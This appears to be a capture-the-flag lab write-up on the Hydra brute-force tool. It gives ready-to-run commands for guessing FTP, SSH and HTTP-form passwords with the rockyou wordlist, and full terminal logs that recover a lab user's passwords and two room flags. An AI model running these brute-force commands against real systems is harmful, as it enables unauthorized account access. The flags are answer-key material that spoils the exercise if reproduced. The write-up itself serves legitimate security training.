# Hydra


- Hydra - a brute force online password cracking program
```
Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.
```

## Hydra Commands
- FTP
    - `hydra -l user -P passlist.txt ftp://10.10.57.97`
- SSH
    - `hydra -l <username> -P <full path to pass> 10.10.57.97 -t 4 ssh`
- Hydra can be used to brute force HTTP using requests. The specific request being used for login will need to be known, and can be found with developer tools on the browser. Burp can also be useful
    - Ex. `hydra -l <username> -P <wordlist> 10.10.57.97 http-post-form "/<directory>:username=^USER^&password=^PASS^:F=incorrect" -V`
    - ![Description](Images/http.png)

## Exercise
1. Use the http example for hydra to find `THM{2673a7dd116de68e85c48ec0b1f2612e}`
```
root@ip-10-10-139-71:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.97 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-02-15 04:13:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.57.97:80//login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "123456" - 1 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "12345" - 2 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "password" - 4 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "iloveyou" - 5 of 14344398 [child 4] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "princess" - 6 of 14344398 [child 5] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "1234567" - 7 of 14344398 [child 6] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "rockyou" - 8 of 14344398 [child 7] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "12345678" - 9 of 14344398 [child 8] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "abc123" - 10 of 14344398 [child 9] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "nicole" - 11 of 14344398 [child 10] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "daniel" - 12 of 14344398 [child 11] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "babygirl" - 13 of 14344398 [child 12] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "monkey" - 14 of 14344398 [child 13] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "lovely" - 15 of 14344398 [child 14] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "jessica" - 16 of 14344398 [child 15] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "654321" - 17 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "michael" - 18 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "ashley" - 19 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "qwerty" - 20 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "111111" - 21 of 14344398 [child 4] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "iloveu" - 22 of 14344398 [child 7] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "000000" - 23 of 14344398 [child 9] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "michelle" - 24 of 14344398 [child 14] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "tigger" - 25 of 14344398 [child 5] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "sunshine" - 26 of 14344398 [child 6] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "chocolate" - 27 of 14344398 [child 8] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "password1" - 28 of 14344398 [child 10] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "soccer" - 29 of 14344398 [child 11] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "anthony" - 30 of 14344398 [child 12] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "friends" - 31 of 14344398 [child 13] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "butterfly" - 32 of 14344398 [child 15] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "purple" - 33 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "angel" - 34 of 14344398 [child 3] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "jordan" - 35 of 14344398 [child 9] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "liverpool" - 36 of 14344398 [child 14] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "justin" - 37 of 14344398 [child 7] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "loveme" - 38 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "fuckyou" - 39 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "123123" - 40 of 14344398 [child 4] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "football" - 41 of 14344398 [child 5] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "secret" - 42 of 14344398 [child 8] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "andrea" - 43 of 14344398 [child 10] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "carlos" - 44 of 14344398 [child 11] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "jennifer" - 45 of 14344398 [child 12] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "joshua" - 46 of 14344398 [child 13] (0/0)
[ATTEMPT] target 10.10.57.97 - login "molly" - pass "bubbles" - 47 of 14344398 [child 15] (0/0)
[80][http-post-form] host: 10.10.57.97   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-02-15 04:13:14
```

2. Use ssh example to find `THM{c8eeb0468febbadea859baeb33b2541b}`
```
root@ip-10-10-139-71:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.97 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-02-15 04:36:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.57.97:22/
[22][ssh] host: 10.10.57.97   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2022-02-15 04:36:49
```
